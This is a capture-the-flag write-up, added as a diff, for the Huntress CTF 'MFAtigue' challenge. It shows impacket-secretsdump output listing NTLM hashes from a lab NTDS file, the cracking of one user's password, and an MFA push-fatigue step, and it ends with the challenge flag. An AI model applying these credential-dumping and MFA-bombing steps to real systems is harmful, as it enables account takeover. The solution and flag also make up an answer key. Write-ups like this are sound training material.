@@ -1,0 +1,77 @@
+Challenge: MFAtigue
+Category: Miscellaneous
+Difficulty: medium
+Author: Adam Rice
+
+Description: We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...
+
+Download the file(s) below and press the Start button on the top-right to begin this challenge.
+Attachments: NTDS.zip
+
+Solution:
+
+1. Download and extract NTDS.zip
+2. Dump the hashes with "impacket-secretsdump" (truncated output)
+
+┌──(kali㉿kali)-[~/CTF/huntress2023/misc/mfatigue]
+└─$ sudo impacket-secretsdump -system SYSTEM -ntds ntds.dit local
+[sudo] password for kali: 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xf08b286576ad88218db21b35b32c8781
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: fb06bfcd3d32cb05e283f56de267f5be
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ffcddea58170b42267fa689f0fa119:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WIN-UUTKPJ98ERD$:1000:aad3b435b51404eeaad3b435b51404ee:ef38fd14274db386b7b5bbddcb37f953:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:948e12fcf27797f773c901c7e1b069d8:::
+huntressctf.local\PAMELA_MCCARTHY:1103:aad3b435b51404eeaad3b435b51404ee:98574cb0badfc5d11094dd239af97da2:::
+huntressctf.local\MATHEW_BERG:1104:aad3b435b51404eeaad3b435b51404ee:c7e3f4aa78cb46c0b47e61809cef8ca8:::
+huntressctf.local\ETHAN_WELCH:1105:aad3b435b51404eeaad3b435b51404ee:151cb8e8e6b942bb0495e88c02365c19:::
+huntressctf.local\RILEY_LANGLEY:1106:aad3b435b51404eeaad3b435b51404ee:565911c8b1e206319277f50207377fb1:::
+huntressctf.local\PASQUALE_CHRISTIAN:1107:aad3b435b51404eeaad3b435b51404ee:7a2c60c628bda5d963a5934ec733f85f:::
+huntressctf.local\HELENA_HESS:1108:aad3b435b51404eeaad3b435b51404ee:feb58b0c807bc1ef3adc390dabc1f6ac:::
+huntressctf.local\SALLIE_BALLARD:1109:aad3b435b51404eeaad3b435b51404ee:e7c417bd62f442b1ee53bf70c8d656ef:::
+huntressctf.local\LOU_NAVARRO:1110:aad3b435b51404eeaad3b435b51404ee:189b758028dc7ea177e26b990f09aad0:::
+huntressctf.local\EDGARDO_DOWNS:1111:aad3b435b51404eeaad3b435b51404ee:38170f23f241863a09d07b2f438fe35a:::
+huntressctf.local\GENE_SAWYER:1112:aad3b435b51404eeaad3b435b51404ee:3f8aa43a8714b6cba6438ab8e2890576:::
+huntressctf.local\JILLIAN_DOTSON:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::
+huntressctf.local\EILEEN_NGUYEN:1114:aad3b435b51404eeaad3b435b51404ee:a03d6125a5d27301c10657d20bcb11f0:::
+huntressctf.local\8385424457SA:1115:aad3b435b51404eeaad3b435b51404ee:a41edb7e4b7e68bb594d42de289ef4e2:::
+huntressctf.local\BERTIE_PRINCE:1116:aad3b435b51404eeaad3b435b51404ee:eb0694cb60d647825ebc6420e0b4f4d4:::
+huntressctf.local\KIRK_BARKER:1117:aad3b435b51404eeaad3b435b51404ee:04f60aa2def14e3a0703480d46a74b5c:::
+huntressctf.local\PHOEBE_LEWIS:1118:aad3b435b51404eeaad3b435b51404ee:9bc8530fb646ed162646f50dab5ca44a:::
+huntressctf.local\LILY_DUNLAP:1119:aad3b435b51404eeaad3b435b51404ee:ab69b9f2f7db11b28dde05ef92961335:::
+SECWWEBS1000000$:1124:aad3b435b51404eeaad3b435b51404ee:ced0af30b76eb4ef16f60ffd2a4bef4b:::
+(...)
+
+3. Parse our the NTLM hashes and feed them into crackstation.net
+
+98574cb0badfc5d11094dd239af97da2
+c7e3f4aa78cb46c0b47e61809cef8ca8
+151cb8e8e6b942bb0495e88c02365c19
+565911c8b1e206319277f50207377fb1
+7a2c60c628bda5d963a5934ec733f85f
+feb58b0c807bc1ef3adc390dabc1f6ac
+e7c417bd62f442b1ee53bf70c8d656ef
+189b758028dc7ea177e26b990f09aad0
+38170f23f241863a09d07b2f438fe35a
+3f8aa43a8714b6cba6438ab8e2890576
+08e75cc7ee80ff06f77c3e54cadab42a
+a03d6125a5d27301c10657d20bcb11f0
+a41edb7e4b7e68bb594d42de289ef4e2
+eb0694cb60d647825ebc6420e0b4f4d4
+04f60aa2def14e3a0703480d46a74b5c
+9bc8530fb646ed162646f50dab5ca44a
+ab69b9f2f7db11b28dde05ef92961335
+
+4. Recover the following hash:
+	a. User: huntressctf.local\JILLIAN_DOTSON
+	b. Password: katlyn99 (08e75cc7ee80ff06f77c3e54cadab42a)
+
+5. Authenticate at the challenge URL: http://chal.ctf.games:31123/
+6. When prompted for the MFA, keep clicking "send request"
+7. Eventually you will be redirected to the flag
+8. Flag: flag{9b896a677de35d7dfa715a05c25ef89e} 
